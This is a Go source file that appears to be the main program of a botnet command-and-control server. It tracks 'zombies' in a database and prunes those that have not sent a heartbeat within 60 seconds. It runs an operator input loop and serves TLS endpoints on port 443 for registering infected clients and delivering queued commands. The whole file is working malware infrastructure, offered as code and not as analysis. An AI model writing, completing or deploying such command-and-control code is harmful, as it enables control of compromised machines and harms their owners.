package main

import (
	"database/sql"
	"flag"
	"log"
	"net/http"
	"strconv"
	"sync"
	"time"
)

// ////// COMMANDS QUEUE
var (
	commandQueue = make(map[string]*ResHeartBeat, 100)
	queueMutex   sync.Mutex
)

// //////////// WEB SERVER CONF ////////////
const PORT = ":443"

// ///////// CHECK CONNECTION AVAILABILITY

const MAX_AVAILABILITY_TIME = 60 //in sec
const CHECKING_DELAY = 10        // in sec

func checkZombiesAvailability(db sql.DB) {
	logPrefix := "[ZMBICHECK] "
	for {
		removedClientNbr := 0
		DbgMsgEx(l, logPrefix+"Checking Zombies Availability", true)
		currentTimeStamp := time.Now()

		query := "SELECT LastConnTime FROM zombies WHERE 1"
		rows, err := db.Query(query)
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {

			var lastConnTime time.Time
			var rawTimeStamp sql.NullString
			if err := rows.Scan(&rawTimeStamp); err != nil {
				Error(l, logPrefix+"(LasConnTime) Error while scanning data")
			}

			//DbgMsgEx(l, "RawTimeStamp: "+rawTimeStamp.String, true)

			if rawTimeStamp.Valid {
				lastConnTime, err = time.Parse("2006-01-02 15:04:05", rawTimeStamp.String)
				if err != nil {
					Error(l, logPrefix+"Error parsing timestamp: "+err.Error())
					continue
				}
			}

			//DbgMsgEx(l, "Found timestamp: "+lastConnTime.Format("2006-01-02 15:04:05"), true)
			//DbgMsgEx(l, "Unix timestamp lastconntime: "+strconv.FormatInt(lastConnTime.Unix(), 10), true)
			if currentTimeStamp.Unix()-lastConnTime.Unix() > MAX_AVAILABILITY_TIME {
				removedClientNbr++
				query1 := "DELETE FROM zombies WHERE lastConnTime = ?"
				rows1, err := db.Query(query1, lastConnTime)
				if err != nil {
					log.Fatal(err)
				}
				defer rows1.Close()

			}
		}

		if err := rows.Err(); err != nil {
			Error(l, logPrefix+"Error while iterating rows")
		}

		DbgMsgEx(l, logPrefix+strconv.Itoa(removedClientNbr)+" zombies deleted", true)
		time.Sleep(CHECKING_DELAY * time.Second)
	}

}

var verbose *bool

func main() {
	verbose = flag.Bool("v", false, "Enable verbosity")
	flag.BoolVar(verbose, "verbose", false, "Enable verbosity")
	flag.Parse()
	if *verbose {
		Log(l, "[ARGS] Verbosity enabled")
	}
	db, dBerr := InitDb()
	if dBerr != nil {
		Error(l, "Error while starting DB: "+dBerr.Error())
	}

	defer db.Close()

	InitCommands()
	go checkZombiesAvailability(*db)
	go UserInput(reader, db)
	// TODO: GOROUTINE TO CHECK SIDs EXPIRATIONS AND PROCESS THEM
	http.HandleFunc("/helloworld", HelloWorld)
	http.HandleFunc("/getSID", GetSID)
	http.HandleFunc("/register", Register(*db))
	http.HandleFunc("/heartBeat", HeartBeat(*db))
	DbgMsgEx(l, "Starting the webserver on "+PORT, true)

	err := http.ListenAndServeTLS(PORT, "certs/server.crt", "certs/server.key", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}

	defer DbgMsg(l, "Stopping the webserver...")

}
